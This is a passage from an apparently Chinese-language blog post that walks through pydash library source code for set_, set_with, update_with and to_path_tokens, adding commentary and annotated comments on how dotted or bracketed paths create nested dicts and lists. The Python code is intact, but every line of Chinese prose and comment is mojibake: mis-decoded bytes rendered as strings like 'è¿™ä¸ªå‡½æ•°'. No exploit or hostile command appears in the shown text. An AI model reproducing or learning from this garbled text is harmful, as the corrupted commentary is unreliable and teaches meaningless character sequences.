&gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.0.c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;0&#x27;: &#123;&#x27;c&#x27;: 1&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_([1, 2], &#x27;[2][0]&#x27;, 1)</span></span><br><span class="line"><span class="string">        [1, 2, [1]]</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.b[0].c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: [&#123;&#x27;c&#x27;: 1&#125;]&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 2.2.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 3.3.0</span></span><br><span class="line"><span class="string">        Added :func:`set_` as main definition and :func:`deep_set` as alias.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 4.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        - Modify `obj` in place.</span></span><br><span class="line"><span class="string">        - Support creating default path values as ``list`` or ``dict`` based on whether key or index</span></span><br><span class="line"><span class="string">          substrings are used.</span></span><br><span class="line"><span class="string">        - Remove alias ``deep_set``.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> set_with(obj, path, value)</span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªå‡½æ•°åº•å±‚æ˜¯ä½¿ç”¨çš„ set_with å‡½æ•°ï¼ŒåŒæ—¶ï¼Œè¿™ä¸ªå‡½æ•°ä¼šå°†ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºæ¨¡æ¿ï¼Œå°†ç¬¬äºŒä¸ªå‚æ•°é€šè¿‡ç‚¹æ„æˆçš„ç±»ä¼¼é“¾å­çš„ä¸œè¥¿é€’å½’æˆä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ç§å¯¹è±¡ç±»ä¼¼äºç¬¬ä¸€ä¸ªå‚æ•°çš„ç±»å‹ï¼Œæ¯”å¦‚ç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥çš„æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œé‚£ä¹ˆä¹…é€’å½’æˆå­—å…¸çš„å½¢å¼ï¼Œå’Œå®ƒä¸¾çš„ä¾‹å­ç›¸ä¼¼ï¼Œè¿™é‡Œä¹…ä¸è¿›è¡Œæ“ä½œäº†ã€‚</p><p>â€‹ç„¶åæ¥ä¸‹æ¥å°±æ˜¯ set_with å‡½æ•°äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_with</span>(<span class="params">obj, path, value, customizer=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    This method is like :func:`set_` except that it accepts customizer which is invoked to produce</span></span><br><span class="line"><span class="string">    the objects of path. If customizer returns undefined path creation is handled by the method</span></span><br><span class="line"><span class="string">    instead. The customizer is invoked with three arguments: ``(nested_value, key, nested_object)``.</span></span><br><span class="line"><span class="string">    è¿™ä¸ªæ–¹æ³•ç±»ä¼¼äºï¼šfunc:`set_`ï¼Œé™¤äº†å®ƒæ¥å—å®šåˆ¶å™¨ï¼Œè°ƒç”¨customizerç”Ÿæˆè·¯å¾„çš„å¯¹è±¡ã€‚å¦‚æœcustomizerè¿”å›æœªå®šä¹‰çš„è·¯å¾„ï¼Œåˆ™ç”±è¯¥æ–¹æ³•å¤„ç†è·¯å¾„åˆ›å»º</span></span><br><span class="line"><span class="string">ç›¸åã€‚ä½¿ç”¨ä¸‰ä¸ªå‚æ•°è°ƒç”¨customizerï¼š`ï¼ˆnested_valueã€keyã€nested_objectï¼‰``</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str | list): Target path to set value to.</span></span><br><span class="line"><span class="string">        value (mixed): Value to set.</span></span><br><span class="line"><span class="string">        customizer (callable, optional): The function to customize assigned values.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Modified `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_with(&#123;&#125;, &#x27;[0][1]&#x27;, &#x27;a&#x27;, lambda: &#123;&#125;)</span></span><br><span class="line"><span class="string">        &#123;0: &#123;1: &#x27;a&#x27;&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 4.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 4.3.1</span></span><br><span class="line"><span class="string">        Fixed bug where a callable `value` was called when being set.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> update_with(obj, path, pyd.constant(value), customizer=customizer)</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªå‡½æ•°åº•å±‚è°ƒç”¨äº† update_with å‡½æ•°ï¼Œè·Ÿè¿›çœ‹çœ‹ï¼Œè¿™ä¸ªå‡½æ•°ä¸æ˜¯å¾ˆèƒ½ææ‡‚ customizer è¿™ä¸ªå‚æ•°çš„ä½œä¸šã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">update_with</span>(<span class="params">obj, path, updater, customizer=<span class="literal">None</span></span>):  <span class="comment"># noqa: C901</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    This method is like :func:`update` except that it accepts customizer which is invoked to produce</span></span><br><span class="line"><span class="string">    the objects of path. If customizer returns ``None``, path creation is handled by the method</span></span><br><span class="line"><span class="string">    instead. The customizer is invoked with three arguments: ``(nested_value, key, nested_object)``.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str|list): A string or list of keys that describe the object path to modify.</span></span><br><span class="line"><span class="string">        updater (callable): Function that returns updated value.</span></span><br><span class="line"><span class="string">        customizer (callable, optional): The function to customize assigned values.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        è¿™ä¸ªæ–¹æ³•ç±»ä¼¼äºï¼šfunc:`update`ï¼Œé™¤äº†å®ƒæ¥å—å®šåˆ¶å™¨ï¼Œè°ƒç”¨å®šåˆ¶å™¨ç”Ÿæˆ</span></span><br><span class="line"><span class="string">è·¯å¾„çš„å¯¹è±¡ã€‚å¦‚æœå®šåˆ¶å™¨è¿”å›â€œNoneâ€ï¼Œåˆ™è·¯å¾„åˆ›å»ºç”±ä»¥ä¸‹æ–¹æ³•å¤„ç†</span></span><br><span class="line"><span class="string">ç›¸åã€‚ä½¿ç”¨ä¸‰ä¸ªå‚æ•°è°ƒç”¨å®šåˆ¶å™¨ï¼šâ€œï¼ˆnested_valueï¼Œkeyï¼Œnested_objectï¼‰â€ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Updated `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; update_with(&#123;&#125;, &#x27;[0][1]&#x27;, lambda: &#x27;a&#x27;, lambda: &#123;&#125;)</span></span><br><span class="line"><span class="string">        &#123;0: &#123;1: &#x27;a&#x27;&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 4.0.0</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">callable</span>(updater):</span><br><span class="line">        updater = pyd.constant(updater)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> customizer <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">callable</span>(customizer):</span><br><span class="line">        call_customizer = partial(callit, clone, customizer, argcount=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> customizer:</span><br><span class="line">        call_customizer = partial(callit, customizer, argcount=getargcount(customizer, maxargs=<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        call_customizer = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    default_type = <span class="built_in">dict</span> <span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">dict</span>) <span class="keyword">else</span> <span class="built_in">list</span></span><br><span class="line">    <span class="comment">#ä½¿ç”¨ to_path_tokens(path) å°† path è½¬æ¢ä¸ºè·¯å¾„æ ‡è®°çš„åˆ—è¡¨ã€‚</span></span><br><span class="line">    tokens = to_path_tokens(path)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#å¦‚æœè§£æç»“æœä¸æ˜¯åˆ—è¡¨ï¼Œåˆ™å°†å…¶è½¬æ¢ä¸ºå•å…ƒç´ åˆ—è¡¨ã€‚</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pyd.is_list(tokens):  <span class="comment"># pragma: no cover</span></span><br><span class="line">        tokens = [tokens]</span><br><span class="line"></span><br><span class="line">    last_key = pyd.last(tokens)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(last_key, PathToken):</span><br><span class="line">        last_key = last_key.key</span><br><span class="line"></span><br><span class="line">    target = obj</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx, token <span class="keyword">in</span> <span class="built_in">enumerate</span>(pyd.initial(tokens)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(token, PathToken):</span><br><span class="line">            key = token.key</span><br><span class="line">            default_factory = pyd.get(tokens, [idx + <span class="number">1</span>, <span class="string">&quot;default_factory&quot;</span>], default=default_type)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            key = token</span><br><span class="line">            default_factory = default_type</span><br><span class="line"></span><br><span class="line">        obj_val = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">        path_obj = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> call_customizer:</span><br><span class="line">            path_obj = call_customizer(obj_val, key, target)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> path_obj <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            path_obj = default_factory()</span><br><span class="line"></span><br><span class="line">        base_set(target, key, path_obj, allow_override=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            target = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">except</span> TypeError <span class="keyword">as</span> exc:  <span class="comment"># pragma: no cover</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                target = target[<span class="built_in">int</span>(key)]</span><br><span class="line">                _failed = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                _failed = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> _failed:</span><br><span class="line">                <span class="keyword">raise</span> TypeError(<span class="string">f&quot;Unable to update object at index <span class="subst">&#123;key!r&#125;</span>. <span class="subst">&#123;exc&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    value = base_get(target, last_key, default=<span class="literal">None</span>)</span><br><span class="line">    base_set(target, last_key, callit(updater, value))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> obj</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå…ˆæ”¾ç€è¿™ä¸ªæºç ï¼Œå…ˆè¯»ä¸€ä¸‹ <code>to_path_tokens</code> ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">to_path_tokens</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Parse `value` into :class:`PathToken` objects.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> pyd.is_string(value) <span class="keyword">and</span> (<span class="string">&quot;.&quot;</span> <span class="keyword">in</span> value <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> value):</span><br><span class="line">        <span class="comment"># Since we can&#x27;t tell whether a bare number is supposed to be dict key or a list index, we</span></span><br><span class="line">        <span class="comment"># support a special syntax where any string-integer surrounded by brackets is treated as a</span></span><br><span class="line">        <span class="comment"># list index and converted to an integer.</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#ç”±äºæˆ‘ä»¬æ— æ³•åˆ¤æ–­ä¸€ä¸ªç©ºæ•°åº”è¯¥æ˜¯å­—å…¸é”®è¿˜æ˜¯åˆ—è¡¨ç´¢å¼•ï¼Œæˆ‘ä»¬</span></span><br><span class="line"><span class="comment">#æ”¯æŒä¸€ç§ç‰¹æ®Šè¯­æ³•ï¼Œå…¶ä¸­ä»»ä½•è¢«æ‹¬å·æ‹¬èµ·æ¥çš„å­—ç¬¦ä¸²æ•´æ•°éƒ½è¢«è§†ä¸º</span></span><br><span class="line"><span class="comment">#åˆ—è¡¨ç´¢å¼•å¹¶è½¬æ¢ä¸ºæ•´æ•°ã€‚</span></span><br><span class="line">        keys = [ <span class="comment">#ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ RE_PATH_KEY_DELIMæ¥åˆ†å‰²å­—ç¬¦ä¸²ã€‚åˆ†å‰²åï¼Œå¯¹äºæ¯ä¸ªéƒ¨åˆ†ï¼ˆkeyï¼‰ï¼Œä¼šè¿›ä¸€æ­¥æ£€æŸ¥ï¼š</span></span><br><span class="line">            PathToken(<span class="built_in">int</span>(key[<span class="number">1</span>:-<span class="number">1</span>]), default_factory=<span class="built_in">list</span>)</span><br><span class="line">            <span class="comment">#å¦‚æœ key åŒ¹é… RE_PATH_LIST_INDEXï¼Œåˆ™å°†è¯¥éƒ¨åˆ†è§†ä¸ºåˆ—è¡¨ç´¢å¼•ï¼Œå¹¶åˆ›å»ºä¸€ä¸ª PathToken å¯¹è±¡ï¼Œå…¶é”®ä¸ºè½¬æ¢åçš„æ•´æ•°ç´¢å¼•ï¼Œé»˜è®¤å€¼ç”Ÿæˆå™¨ä¸º listã€‚</span></span><br><span class="line">            <span class="keyword">if</span> RE_PATH_LIST_INDEX.<span class="keyword">match</span>(key)</span><br><span class="line">            <span class="keyword">else</span> PathToken(unescape_path_key(key), default_factory=<span class="built_in">dict</span>)</span><br><span class="line">            <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, RE_PATH_KEY_DELIM.split(value))</span><br><span class="line">        ]</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#å¦‚æœ key ä¸åŒ¹é… RE_PATH_LIST_INDEXï¼Œåˆ™å°†å…¶è§†ä¸ºå­—å…¸é”®ï¼Œå¹¶é€šè¿‡ unescape_path_keyï¼ˆæœªåœ¨ä»£ç æ®µä¸­å®šä¹‰ï¼Œä½†æˆ‘ä»¬å¯ä»¥å‡è®¾å®ƒç”¨äºå¤„ç†å¯èƒ½çš„è½¬ä¹‰å­—ç¬¦ï¼‰å‡½æ•°å¤„ç†åï¼Œåˆ›å»ºä¸€ä¸ª PathToken å¯¹è±¡ï¼Œå…¶é”®ä¸ºå¤„ç†åçš„å­—ç¬¦ä¸²ï¼Œé»˜è®¤å€¼ç”Ÿæˆå™¨ä¸º dictã€‚</span></span><br><span class="line">    <span class="keyword">elif</span> pyd.is_string(value) <span class="keyword">or</span> pyd.is_number(value):</span><br><span class="line">        keys = [PathToken(value, default_factory=<span class="built_in">dict</span>)]</span><br><span class="line">    <span class="comment">#å¦‚æœ value æ˜¯ UNSETåˆ™è¿”å›ä¸€ä¸ªç©ºçš„ PathToken åˆ—è¡¨ã€‚</span></span><br><span class="line">    <span class="keyword">elif</span> value <span class="keyword">is</span> UNSET:</span><br><span class="line">        keys = []</span><br><span class="line">    <span class="comment">#å¦‚æœ value ä¸æ˜¯ä¸Šè¿°ä»»ä½•ä¸€ç§æƒ…å†µï¼ˆå³å®ƒå¯èƒ½å·²ç»æ˜¯ä¸€ä¸ªåˆ—è¡¨æˆ–ç±»ä¼¼ç»“æ„ï¼‰ï¼Œåˆ™ç›´æ¥è¿”å› valueï¼ˆå°½ç®¡è¿™é‡Œå¯èƒ½å­˜åœ¨ä¸€ä¸ªç±»å‹ä¸åŒ¹é…çš„é—®é¢˜ï¼Œå› ä¸ºé€šå¸¸æˆ‘ä»¬æœŸæœ›è¿”å›çš„æ˜¯ PathToken å¯¹è±¡çš„åˆ—è¡¨ï¼Œè€Œä¸æ˜¯åŸå§‹å€¼ï¼‰ã€‚ç„¶è€Œï¼ŒåŸºäºå‡½æ•°çš„å‘½åå’Œæè¿°ï¼Œè¿™å¯èƒ½æ˜¯ä¸€ä¸ªé”™è¯¯æˆ–ç‰¹æ®Šæƒ…å†µçš„å¤„ç†æ–¹å¼ã€‚</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        keys = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> keys</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œæ¯”è¾ƒé‡è¦ï¼Œåˆ†æä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#éå†pathå¹¶æ›´æ–°å¯¹è±¡</span></span><br><span class="line"><span class="keyword">for</span> idx, token <span class="keyword">in</span> <span class="built_in">enumerate</span>(pyd.initial(tokens)):<span class="comment">#è¿™è¡Œä»£ç ä½¿ç”¨enumerateå‡½æ•°éå†tokensåˆ—è¡¨ï¼Œä½†é€šè¿‡pyd.initialå‡½æ•°æ¥è·å–é™¤äº†æœ€åä¸€ä¸ªå…ƒç´ ä¹‹å¤–çš„æ‰€æœ‰å…ƒç´ ã€‚è¿™æ„å‘³ç€éå†å°†è·³è¿‡tokensåˆ—è¡¨çš„æœ€åä¸€ä¸ªå…ƒç´ ã€‚</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#è¿™é‡Œæ£€æŸ¥å½“å‰éå†åˆ°çš„tokenæ˜¯å¦æ˜¯PathTokenç±»çš„å®ä¾‹ã€‚å¦‚æœæ˜¯ï¼Œåˆ™ä»tokenä¸­æå–keyå€¼ï¼Œå¹¶å°è¯•ä»tokensä¸­è·å–ä¸‹ä¸€ä¸ªå…ƒç´ çš„default_factoryã€‚å¦‚æœä¸å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨default_typeä½œä¸ºé»˜è®¤å€¼ã€‚</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(token, PathToken):</span><br><span class="line">        key = token.key</span><br><span class="line">        default_factory = pyd.get(tokens, [idx + <span class="number">1</span>, <span class="string">&quot;default_factory&quot;</span>], default=default_type)</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#å¦‚æœtokenä¸æ˜¯PathTokenç±»çš„å®ä¾‹ï¼Œåˆ™ç›´æ¥å°†tokenä½œä¸ºkeyï¼Œå¹¶å°†default_factoryè®¾ç½®ä¸ºdefault_typeã€‚</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key = token</span><br><span class="line">        default_factory = default_type</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="comment">#ä½¿ç”¨base_getå‡½æ•°å°è¯•ä»targetå¯¹è±¡ä¸­è·å–keyå¯¹åº”çš„å€¼ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°åˆ™é»˜è®¤ä¸ºNoneã€‚åŒæ—¶ï¼Œå°†path_objåˆå§‹åŒ–ä¸ºNoneã€‚</span></span><br><span class="line">    obj_val = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">    path_obj = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#å¦‚æœcall_customizerä¸ºçœŸï¼ˆå‡è®¾æ˜¯ä¸€ä¸ªå‡½æ•°ï¼‰ï¼Œåˆ™è°ƒç”¨è¯¥å‡½æ•°ï¼Œå¹¶ä¼ å…¥å½“å‰å€¼obj_valã€é”®keyå’Œç›®æ ‡å¯¹è±¡targetï¼Œç»“æœèµ‹å€¼ç»™path_objã€‚</span></span><br><span class="line">    <span class="keyword">if</span> call_customizer:</span><br><span class="line">        path_obj = call_customizer(obj_val, key, target)</span><br><span class="line">        </span><br><span class="line"><span class="comment">#å¦‚æœpath_objä»ç„¶æ˜¯Noneï¼Œåˆ™è°ƒç”¨default_factoryæ¥åˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™path_objã€‚</span></span><br><span class="line">    <span class="keyword">if</span> path_obj <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        path_obj = default_factory()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#ä½¿ç”¨base_setå‡½æ•°å°†path_objè®¾ç½®åˆ°targetå¯¹è±¡çš„keyä½ç½®ä¸Šï¼Œä¸”ä¸å…è®¸è¦†ç›–</span></span><br><span class="line">    base_set(target, key, path_obj, allow_override=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#å°è¯•é‡æ–°è·å–targetå¯¹è±¡ä¸­keyå¯¹åº”çš„å€¼ï¼Œå¦‚æœå¤±è´¥ï¼Œä¼šæ•è·TypeErrorã€‚åœ¨æ•è·å¼‚å¸¸çš„å¤„ç†ä¸­ï¼Œå°è¯•å°†keyä½œä¸ºç´¢å¼•æ¥ç›´æ¥ä»targetä¸­è·å–å…ƒç´ ã€‚å¦‚æœè¿™ä¹Ÿå¤±è´¥ï¼Œåˆ™æ ‡è®°ä¸ºå¤±è´¥ï¼ˆ_failed = Trueï¼‰å¹¶æŠ›å‡ºä¸€ä¸ªåŒ…å«åŸå§‹å¼‚å¸¸ä¿¡æ¯çš„TypeErrorã€‚</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        target = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">except</span> TypeError <span class="keyword">as</span> exc:  <span class="comment"># pragma: no cover</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            target = target[<span class="built_in">int</span>(key)]</span><br><span class="line">            _failed = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            _failed = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> _failed:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">f&quot;Unable to update object at index <span class="subst">&#123;key!r&#125;</span>. <span class="subst">&#123;exc&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ª  <code>update_with</code>  å‡½æ•°çš„ä½œç”¨å¯ä»¥æ€»ç»“å¦‚ä¸‹ï¼š</p><ol><li><strong>æ›´æ–°åµŒå¥—å¯¹è±¡</strong>ï¼šå‡½æ•°ç”¨äºåœ¨ç»™å®šçš„  <code>obj</code> ï¼ˆä¸€ä¸ªåˆ—è¡¨æˆ–å­—å…¸ï¼‰ä¸­æŒ‰ç…§  <code>path</code>  æŒ‡å®šçš„è·¯å¾„æ›´æ–°ä¸€ä¸ªå€¼ã€‚</li><li><strong>è·¯å¾„å¤„ç†</strong>ï¼š <code>path</code>  å¯ä»¥æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–é”®çš„åˆ—è¡¨ï¼Œæè¿°äº†è¦ä¿®æ”¹çš„å¯¹è±¡è·¯å¾„ã€‚</li><li><strong>è‡ªå®šä¹‰æ›´æ–°</strong>ï¼š <code>updater</code>  æ˜¯ä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ï¼Œå®ƒç”¨äºç”Ÿæˆæ›´æ–°åçš„å€¼ã€‚å¦‚æœ  <code>updater</code>  ä¸æ˜¯ä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ï¼Œå®ƒä¼šè¢«è½¬æ¢ä¸ºä¸€ä¸ªè¿”å›å¸¸é‡å€¼çš„å‡½æ•°ã€‚</li><li><strong>è‡ªå®šä¹‰å€¼ç”Ÿæˆ</strong>ï¼š <code>customizer</code>  æ˜¯ä¸€ä¸ªå¯é€‰çš„å¯è°ƒç”¨å¯¹è±¡ï¼Œå®ƒç”¨äºè‡ªå®šä¹‰è·¯å¾„ä¸Šçš„å¯¹è±¡å€¼ã€‚å¦‚æœ  <code>customizer</code>  è¿”å›  <code>None</code> 